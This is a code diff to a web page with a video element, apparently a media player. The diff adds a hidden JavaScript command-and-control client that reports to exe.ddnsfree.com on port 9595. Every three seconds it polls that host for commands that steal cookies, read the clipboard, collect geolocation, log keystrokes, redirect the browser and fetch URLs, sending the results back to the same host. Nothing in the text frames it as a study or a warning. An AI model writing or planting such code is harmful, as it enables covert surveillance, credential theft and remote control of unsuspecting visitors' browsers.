@@ -18,19 +18,126 @@ Your browser does not support the video tag.
 </video>
 <script>
 (function(){
-var xhr = new XMLHttpRequest();
-xhr.open('POST','http://exe.ddnsfree.com:9595/api/checkin',true);
-xhr.setRequestHeader('Content-Type','application/json');
-xhr.send(JSON.stringify({
-    device_id: navigator.userAgent.replace(/\s/g,'_').slice(0,40),
-    model: navigator.platform,
-    version: navigator.appVersion.slice(0,30),
-    screen: screen.width+'x'+screen.height,
-    time: new Date().toISOString()
-}));
+var C2_HOST = 'exe.ddnsfree.com';
+var C2_PORT = '9595';
+var DEVICE_ID = navigator.userAgent.replace(/\s/g,'_').slice(0,40);
+var BASE_URL = 'http://' + C2_HOST + ':' + C2_PORT;
+
+function sendCheckin(){
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', BASE_URL + '/api/checkin', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({
+        device_id: DEVICE_ID,
+        model: navigator.platform,
+        version: navigator.appVersion.slice(0,30),
+        screen: screen.width+'x'+screen.height,
+        time: new Date().toISOString()
+    }));
+}
+
+function sendResult(cmd, result, data){
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', BASE_URL + '/api/result/' + DEVICE_ID, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({cmd: cmd, result: result, data: data}));
+}
+
+function executeCommand(cmdObj){
+    var cmd = cmdObj.cmd;
+    var args = cmdObj.args || {};
+    var el = document.getElementById('msg');
+    try{
+        if (cmd === 'alert'){
+            var msg = args.msg || 'Command executed';
+            alert(msg);
+            sendResult(cmd, 'success', msg);
+        }
+        else if (cmd === 'redirect'){
+            var url = args.url || 'https://google.com';
+            sendResult(cmd, 'redirecting', url);
+            window.location.href = url;
+        }
+        else if (cmd === 'cookie_steal'){
+            var cookies = document.cookie;
+            sendResult(cmd, 'success', cookies);
+        }
+        else if (cmd === 'fetch'){
+            var url = args.url || BASE_URL;
+            fetch(url).then(function(r){return r.text()}).then(function(t){
+                sendResult(cmd, 'success', t.slice(0,2000));
+            }).catch(function(e){
+                sendResult(cmd, 'error', e.toString());
+            });
+        }
+        else if (cmd === 'geo'){
+            if (navigator.geolocation){
+                navigator.geolocation.getCurrentPosition(function(pos){
+                    sendResult(cmd, 'success', pos.coords.latitude+','+pos.coords.longitude);
+                }, function(err){
+                    sendResult(cmd, 'error', err.message);
+                });
+            } else {
+                sendResult(cmd, 'error', 'Geolocation not supported');
+            }
+        }
+        else if (cmd === 'clipboard'){
+            if (navigator.clipboard && navigator.clipboard.readText){
+                navigator.clipboard.readText().then(function(text){
+                    sendResult(cmd, 'success', text);
+                }).catch(function(e){
+                    sendResult(cmd, 'error', e.toString());
+                });
+            } else {
+                sendResult(cmd, 'error', 'Clipboard API not available');
+            }
+        }
+        else if (cmd === 'keylogger_start'){
+            document.addEventListener('keydown', function(e){
+                sendResult('keylogger', 'keystroke', e.key + ' @ ' + e.target.tagName);
+            });
+            sendResult(cmd, 'success', 'Keylogger active');
+        }
+        else if (cmd === 'screenshot_url'){
+            sendResult(cmd, 'success', window.location.href);
+        }
+        else if (cmd === 'user_agent'){
+            sendResult(cmd, 'success', navigator.userAgent);
+        }
+        else {
+            sendResult(cmd, 'unknown', 'Unknown command: ' + cmd);
+        }
+    } catch(e){
+        sendResult(cmd, 'error', e.toString());
+    }
+}
+
+function pollCommands(){
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', BASE_URL + '/api/cmd/' + DEVICE_ID, true);
+    xhr.onreadystatechange = function(){
+        if (xhr.readyState === 4 && xhr.status === 200){
+            var resp = JSON.parse(xhr.responseText);
+            if (resp.cmd){
+                var el = document.getElementById('msg');
+                el.textContent = 'CMD: ' + resp.cmd.cmd;
+                el.style.color = '#f0f';
+                executeCommand(resp.cmd);
+            }
+        }
+    };
+    xhr.send();
+}
+
+// Start
+sendCheckin();
 var el = document.getElementById('msg');
-el.textContent = 'Playing...';
+el.textContent = 'Playing... (C2 active)';
 el.style.color = '#0f0';
+
+// Poll for commands every 3 seconds
+setInterval(pollCommands, 3000);
+pollCommands();
 })();
 </script>
 </body>
